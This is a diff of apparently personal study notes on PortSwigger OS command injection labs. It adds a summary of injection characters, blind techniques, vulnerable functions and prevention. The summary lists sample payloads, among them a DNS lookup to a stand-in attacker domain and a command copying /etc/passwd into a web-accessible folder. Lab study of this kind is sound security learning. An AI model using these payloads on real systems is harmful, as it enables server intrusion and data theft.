@@ -2,6 +2,52 @@
 - https://portswigger.net/web-security/os-command-injection
 - https://book.hacktricks.xyz/pentesting-web/command-injection
 
+## Summary
+OS command injection (also called shell injection) is a web security vulnerability that allows attackers to execute arbitrary operating system commands on the server running an application, typically with the same privileges as the application itself.
+
+This vulnerability occurs when an application passes unsafe user-supplied data to a system shell. An attacker can inject additional commands to be executed by the operating system using shell metacharacters.
+
+### Common Injection Characters:
+- Semicolons (`;`) to terminate commands
+- Ampersands (`&`, `&&`) for command chaining
+- Pipes (`|`) to redirect output
+- Backticks (`` ` ``) or `$()` for command substitution
+
+### Types of OS Command Injection:
+1. **In-band injection**: Results are returned directly in the application's response
+2. **Blind injection**: No direct output, requires techniques like:
+    - Time delays (using `sleep` or similar commands)
+    - Out-of-band techniques (forcing DNS lookups or HTTP requests)
+    - File operations (writing to accessible locations)
+
+### Detection Methods
+- Testing with platform-specific commands (Windows: `dir`, Unix: `ls`)
+- Injecting command separators and monitoring responses
+- Using time-based techniques for blind scenarios
+
+### Exploitation Examples
+
+- Basic injection: `& echo vulnerability confirmed &`
+- Command chaining: `input=original-input && whoami`
+- DNS exfiltration: `& nslookup attacker-controlled-domain.com &`
+- Data exfiltration through file redirection: `& cat /etc/passwd > /var/www/html/accessible-file.txt &`
+
+### Common Vulnerable Functions
+Programming language functions that often lead to command injection:
+- PHP: `system()`, `exec()`, `shell_exec()`, `passthru()`
+- Python: `os.system()`, `subprocess.call()`, `subprocess.Popen()`
+- Java: `Runtime.exec()`, `ProcessBuilder`
+- NodeJS: `child_process.exec()`
+
+### Prevention Techniques
+1. **Avoid OS commands**: Use built-in application language functions instead
+2. **Input validation**: Implement strict whitelisting
+3. **Context-specific output encoding**
+4. **Use safer APIs**: Instead of passing strings to shell interpreters, use safer system call APIs
+5. **Run with limited privileges**: Apply least privilege principle
+6. **Web Application Firewalls**: As an additional layer of defense
+
+
 ## **1. OS command injection, simple case**
 This lab contains an [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the product stock checker.
 
@@ -41,7 +87,7 @@ Analysis:
 	![[Pasted image 20241007180742.png]]
 	![[Pasted image 20241007181105.png]]
 
-## **3. Blind OS command injection with time delays**
+## **3. Blind OS command injection with output redirection**
 This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.
 
 The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: `/var/www/images/`
@@ -74,7 +120,7 @@ Analysis:
 	`GET/image?filname=output.txt` 
 	![[Pasted image 20241007201453.png]]
 
-## **4. Blind OS command injection with out-of-band interaction
+## 4. Blind OS command injection with out-of-band interaction
 
 This lab contains a blind OS [command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.
 
@@ -88,7 +134,7 @@ To solve the lab, exploit the blind OS command injection vulnerability to issue 
 Analysis:
 ![[Pasted image 20241008193453.png]]
 
-## **5.  Blind OS command injection with out-of-band data exfiltration**
+## 5. Blind OS command injection with out-of-band data exfiltration
 This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.
 
 The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
